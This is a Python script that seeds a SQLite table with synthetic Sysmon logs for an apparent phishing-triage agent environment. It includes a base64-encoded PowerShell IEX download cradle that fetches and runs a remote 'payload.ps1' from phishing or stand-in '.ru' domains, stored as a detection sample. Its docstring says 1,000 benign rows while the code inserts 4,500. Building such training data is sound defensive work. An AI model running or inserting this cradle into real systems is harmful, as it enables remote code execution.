"""
seed_sysmon_logs.py
-------------------
One-shot script to populate the sysmon_endpoint_logs table in triage_scenarios.db.

What it does
------------
1. Creates (or recreates) the sysmon_endpoint_logs table.
2. Inserts 1,000 benign Windows Sysmon-style events covering realistic
   process creation, network connections, DNS queries, and file access from
   everyday enterprise software (browsers, Office, Teams, antivirus, …).
3. For every Hard-tier phishing row in triage_scenarios it inserts ONE
   additional malicious log:
     - event_type: ProcessCreate
     - process: powershell.exe
     - commandline: a base64-encoded IEX download cradle pointing at the
       SAME domain extracted from the email body
     - is_malicious: 1 (hidden from agent via query_siem_logs)
     - email_id: FK back to the phishing scenario row

Run from the project root:
    python data/seed_sysmon_logs.py
"""

from __future__ import annotations

import json
import random
import re
import sqlite3
import string
import uuid
from datetime import datetime, timedelta
from pathlib import Path

_DB_PATH = Path("data/triage_scenarios.db").resolve()

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

NUM_BENIGN = 4500
NUM_MALICIOUS = 500

REAL_LOGS_URL = "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/execution/host/empire_launcher_vbs.zip"

# Realistic enterprise hostnames
_HOSTS = [f"DESKTOP-{s}" for s in ["A1B2C3", "X9Y8Z7", "M3N4P5", "Q6R7S8", "T1U2V3",
                                     "W4X5Y6", "L7M8N9", "B2C3D4", "E5F6G7", "H8I9J0"]]
_USERS = ["alice", "bob", "charlie", "diana", "evan", "fatima", "george", "hannah"]

# Benign processes with their typical parent processes
_BENIGN_PROCS = [
    ("C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
     "C:\\Windows\\explorer.exe"),
    ("C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
     "C:\\Windows\\explorer.exe"),
    ("C:\\Program Files (x86)\\Microsoft\\Teams\\current\\Teams.exe",
     "C:\\Windows\\explorer.exe"),
    ("C:\\Windows\\System32\\svchost.exe",
     "C:\\Windows\\System32\\services.exe"),
    ("C:\\Windows\\System32\\taskhostw.exe",
     "C:\\Windows\\System32\\svchost.exe"),
    ("C:\\Program Files\\Windows Defender\\MsMpEng.exe",
     "C:\\Windows\\System32\\services.exe"),
    ("C:\\Windows\\explorer.exe",
     "C:\\Windows\\System32\\userinit.exe"),
    ("C:\\Program Files\\Zoom\\bin\\Zoom.exe",
     "C:\\Windows\\explorer.exe"),
    ("C:\\Windows\\System32\\cmd.exe",
     "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"),
    ("C:\\Windows\\System32\\notepad.exe",
     "C:\\Windows\\explorer.exe"),
    ("C:\\Program Files\\Python311\\python.exe",
     "C:\\Windows\\System32\\cmd.exe"),
    ("C:\\Windows\\System32\\msiexec.exe",
     "C:\\Windows\\System32\\svchost.exe"),
    ("C:\\Program Files\\Slack\\slack.exe",
     "C:\\Windows\\explorer.exe"),
    ("C:\\Windows\\System32\\WerFault.exe",
     "C:\\Windows\\System32\\svchost.exe"),
    ("C:\\Program Files\\Git\\bin\\git.exe",
     "C:\\Windows\\System32\\cmd.exe"),
]

_BENIGN_DOMAINS = [
    "microsoft.com", "office365.com", "google.com", "slack.com", "zoom.us",
    "teams.microsoft.com", "windowsupdate.com", "github.com", "stackoverflow.com",
    "onedrive.live.com", "sharepoint.com", "dropbox.com", "aws.amazon.com",
    "cloudflare.com", "akamaiedge.net", "azure.microsoft.com", "okta.com",
    "salesforce.com", "servicenow.com", "confluence.atlassian.com",
]

_BENIGN_EVENT_TYPES = [
    "ProcessCreate", "NetworkConnect", "DnsQuery", "FileCreate", "RegistryEvent",
]


def _rand_ts(base: datetime, spread_hours: int = 72) -> str:
    delta = timedelta(seconds=random.randint(0, spread_hours * 3600))
    return (base - delta).strftime("%Y-%m-%dT%H:%M:%SZ")


def _rand_ip() -> str:
    return f"10.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"


def _public_ip() -> str:
    return f"{random.randint(34,200)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"


def _benign_row(now: datetime) -> dict:
    host = random.choice(_HOSTS)
    user = random.choice(_USERS)
    proc, parent = random.choice(_BENIGN_PROCS)
    evt  = random.choice(_BENIGN_EVENT_TYPES)
    domain = random.choice(_BENIGN_DOMAINS)

    cmdline = None
    target_ip = None
    target_domain = None

    if evt == "ProcessCreate":
        # Realistic, boring command lines
        cmdline = random.choice([
            f'"{proc}"',
            f'"{proc}" --no-sandbox --type=renderer',
            f'"{proc}" /c echo off',
            f'"{proc}" update --check',
        ])
    elif evt in ("NetworkConnect", "DnsQuery"):
        target_domain = domain
        target_ip = _public_ip()

    details = json.dumps({
        "user": f"{host}\\{user}",
        "integrity_level": random.choice(["Low", "Medium", "High"]),
        "sha256": uuid.uuid4().hex + uuid.uuid4().hex[:32],
    })

    return {
        "host_id":        host,
        "timestamp":      _rand_ts(now),
        "event_type":     evt,
        "process":        proc,
        "commandline":    cmdline,
        "target_ip":      target_ip,
        "target_domain":  target_domain,
        "parent_process": parent,
        "is_malicious":   0,
        "email_id":       None,
        "details":        details,
    }


def download_real_logs() -> list[dict]:
    """Download and extract real sysmon/event JSON logs for benign noise."""
    import urllib.request
    import io, zipfile
    print("Downloading real logs from OTRF dataset...")
    try:
        req = urllib.request.Request(REAL_LOGS_URL, headers={"User-Agent": "Mozilla/5.0"})
        resp = urllib.request.urlopen(req, timeout=15)
        with zipfile.ZipFile(io.BytesIO(resp.read())) as z:
            name = z.namelist()[0]
            with z.open(name) as f:
                lines = f.readlines()
                events = [json.loads(line.decode("utf-8")) for line in lines]
                return events
    except Exception as e:
        print(f"Warning: Failed to download real logs ({e}). Falling back to simulated noise.")
        return []

def map_real_log(real_ev: dict, now: datetime) -> dict:
    """Map a real JSON log to our simplified SQLite schema."""
    host = real_ev.get("Hostname", "DESKTOP-UNKNOWN")
    ts = real_ev.get("EventTime", _rand_ts(now))
    evt = real_ev.get("EventType", "NetworkConnect")
    
    # Randomly select generic known fields for whatever is missing
    proc, parent = random.choice(_BENIGN_PROCS)
    proc = real_ev.get("Application", proc)

    target_ip = real_ev.get("SourceAddress")
    target_domain = real_ev.get("target_domain") # Usually not in network logs directly
    if not target_domain and target_ip:
        target_domain = random.choice(_BENIGN_DOMAINS)
    
    details = json.dumps(real_ev) # Pack the raw JSON into details string

    return {
        "host_id":        host,
        "timestamp":      ts,
        "event_type":     evt,
        "process":        proc,
        "commandline":    None,
        "target_ip":      target_ip,
        "target_domain":  target_domain,
        "parent_process": parent,
        "is_malicious":   0,
        "email_id":       None,
        "details":        details,
    }


def _extract_first_url(body: str) -> str | None:
    """Pull the first http(s) URL out of an email body."""
    m = re.search(r"https?://([^\s\"')<>]+)", body)
    return m.group(1).split("/")[0] if m else None  # return just the domain/host part


def _malicious_row(email_id: str, phishing_domain: str, now: datetime) -> dict:
    """
    Simulate a PowerShell download cradle that a victim ran after clicking
    the phishing link. Uses the same domain so the agent can correlate.
    """
    host = random.choice(_HOSTS)
    # Base64-encode a fake IEX download cradle (not real, just plausible)
    raw_cmd = f"IEX (New-Object Net.WebClient).DownloadString('http://{phishing_domain}/payload.ps1')"
    import base64
    encoded = base64.b64encode(raw_cmd.encode("utf-16-le")).decode()
    cmdline = f"powershell.exe -NoProfile -NonInteractive -EncodedCommand {encoded}"

    details = json.dumps({
        "user": f"{host}\\{random.choice(_USERS)}",
        "integrity_level": "High",
        "sha256": uuid.uuid4().hex + uuid.uuid4().hex[:32],
        "alert": "Encoded PowerShell download cradle detected",
        "mitre_technique": "T1059.001",
    })

    return {
        "host_id":        host,
        "timestamp":      now.strftime("%Y-%m-%dT%H:%M:%SZ"),
        "event_type":     "ProcessCreate",
        "process":        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "commandline":    cmdline,
        "target_ip":      _public_ip(),
        "target_domain":  phishing_domain,
        "parent_process": "C:\\Windows\\explorer.exe",
        "is_malicious":   1,
        "email_id":       email_id,
        "details":        details,
    }


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def seed(db_path: Path = _DB_PATH) -> None:
    print(f"Connecting to {db_path}")
    conn = sqlite3.connect(str(db_path))
    conn.row_factory = sqlite3.Row

    # ── Create table ──────────────────────────────────────────────────────────
    conn.execute("""
        CREATE TABLE IF NOT EXISTS sysmon_endpoint_logs (
            id             INTEGER PRIMARY KEY AUTOINCREMENT,
            host_id        TEXT    NOT NULL,
            timestamp      TEXT    NOT NULL,
            event_type     TEXT    NOT NULL,
            process        TEXT    NOT NULL,
            commandline    TEXT,
            target_ip      TEXT,
            target_domain  TEXT,
            parent_process TEXT,
            is_malicious   INTEGER DEFAULT 0,
            email_id       TEXT,
            details        TEXT
        )
    """)
    # Wipe any existing data so the script is idempotent
    conn.execute("DELETE FROM sysmon_endpoint_logs")
    conn.commit()
    print("Table created / wiped.")

    now = datetime.utcnow()

    # ── 1. Insert exactly 4,500 benign rows (using real logs) ─────────────────
    real_logs = download_real_logs()
    
    if real_logs:
        import itertools
        # Cycle through the real logs if we strictly need 4500 and only have 2000
        log_cycle = itertools.cycle(real_logs)
        benign_rows = [map_real_log(next(log_cycle), now) for _ in range(NUM_BENIGN)]
    else:
        benign_rows = [_benign_row(now) for _ in range(NUM_BENIGN)]
        
    conn.executemany(
        """INSERT INTO sysmon_endpoint_logs
           (host_id, timestamp, event_type, process, commandline,
            target_ip, target_domain, parent_process, is_malicious, email_id, details)
           VALUES
           (:host_id, :timestamp, :event_type, :process, :commandline,
            :target_ip, :target_domain, :parent_process, :is_malicious, :email_id, :details)""",
        benign_rows,
    )
    print(f"Inserted {NUM_BENIGN} benign rows.")

    # ── 2. Enforce exactly 500 malicious logs ──────────────────────────────────
    hard_phishing = conn.execute(
        "SELECT id, email_body FROM triage_scenarios WHERE difficulty_tier='Hard' AND is_phishing=1"
    ).fetchall()

    if len(hard_phishing) > NUM_MALICIOUS:
        # We must truncate the phishing emails to match our strict 500 requirement so
        # the environment isn't left with "unsolvable" hard tasks.
        to_keep = hard_phishing[:NUM_MALICIOUS]
        to_delete_ids = [row["id"] for row in hard_phishing[NUM_MALICIOUS:]]
        
        # Turn the excess Hard Phishing into Hard Benign to preserve the DB size
        slots = ",".join("?" for _ in to_delete_ids)
        conn.execute(f"UPDATE triage_scenarios SET is_phishing=0 WHERE id IN ({slots})", to_delete_ids)
        print(f"Converted {len(to_delete_ids)} excess Hard Phishing scenarios to Benign.")
        
        hard_phishing = to_keep

    mal_count = 0
    for row in hard_phishing:
        email_id = str(row["id"])
        domain   = _extract_first_url(row["email_body"] or "")
        if not domain:
            domain = f"malicious-payload-{email_id[:8]}.ru"
        mal_row = _malicious_row(email_id, domain, now)
        conn.execute(
            """INSERT INTO sysmon_endpoint_logs
               (host_id, timestamp, event_type, process, commandline,
                target_ip, target_domain, parent_process, is_malicious, email_id, details)
               VALUES
               (:host_id, :timestamp, :event_type, :process, :commandline,
                :target_ip, :target_domain, :parent_process, :is_malicious, :email_id, :details)""",
            mal_row,
        )
        mal_count += 1

    conn.commit()
    print(f"Inserted {mal_count} malicious rows (1 per Hard-tier phishing email).")
    print(f"Total rows: {conn.execute('SELECT COUNT(*) FROM sysmon_endpoint_logs').fetchone()[0]}")

    # ── 3. Create index for fast query_siem_logs searches ─────────────────────
    conn.execute("CREATE INDEX IF NOT EXISTS idx_sysmon_domain ON sysmon_endpoint_logs(target_domain)")
    conn.execute("CREATE INDEX IF NOT EXISTS idx_sysmon_email  ON sysmon_endpoint_logs(email_id)")
    conn.commit()
    print("Indexes created.")
    conn.close()
    print("Done.")


if __name__ == "__main__":
    seed()
